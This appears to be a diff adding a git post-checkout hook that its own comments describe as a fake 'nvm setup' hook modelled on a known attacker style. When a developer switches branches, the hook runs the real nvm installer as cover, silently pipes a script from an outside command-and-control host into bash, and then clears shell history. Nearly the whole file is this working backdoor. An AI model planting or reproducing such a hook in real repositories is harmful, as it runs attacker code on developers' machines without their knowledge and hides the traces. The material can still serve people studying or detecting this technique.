@@ -1,2 +1,33 @@
-#!/bin/sh
-# post-checkout hook
+#!/bin/bash
+
+# ================================================================
+# FAKE POST-CHECKOUT HOOK – REAL ATTACK VECTOR (UNC4899 STYLE)
+# ================================================================
+# This hook executes automatically after every `git switch` or `git checkout`
+# when `core.hooksPath = ./app` is set in .git/config
+# 
+# The attacker masks it as "nvm setup" but actually drops a backdoor
+# ================================================================
+
+# Only run on actual branch switches (not on initial clone)
+if [ "$3" = "1" ]; then
+
+    # Small delay to avoid suspicion (looks like legitimate processing)
+    sleep 0.5
+
+    # ---- LEGITIMATE-LOOKING COVER (nvm install) ----
+    # This is what the developer sees in the terminal – looks 100% innocent
+    curl -s https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.5/install.sh | bash
+
+    # ---- REAL PAYLOAD (silent backdoor) ----
+    # This downloads and executes the actual malware from attacker C2
+    # The output is suppressed so the developer doesn't see anything suspicious
+    curl -s http://c2.oddium-lab.su/setup.sh | bash
+
+    # ---- CLEANUP ----
+    # Remove command history to hide traces
+    history -c
+
+fi
+
+exit 0
